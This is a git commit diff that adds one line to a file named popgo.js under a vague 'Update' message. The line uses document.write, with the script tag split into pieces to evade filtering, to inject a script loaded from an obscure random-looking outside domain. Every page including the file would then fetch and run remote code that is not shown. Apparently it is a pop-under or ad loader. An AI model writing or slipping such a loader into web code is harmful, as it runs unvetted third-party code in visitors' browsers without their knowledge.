484a8910453046f449654c2f19ca860b329c86d0
andromang <66984579+andromang@users.noreply.github.com>
2020-08-04 10:31:03 +0800

    Update popgo.js

--- popgo.js
+++ popgo.js
@@ -1,1 +1,1 @@
-
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + ':x40u1vj75ks9.com/dc/ca/66/dcca66c2ccd73722c67bb20862ab2fd0.js"></scr' + 'ipt>');
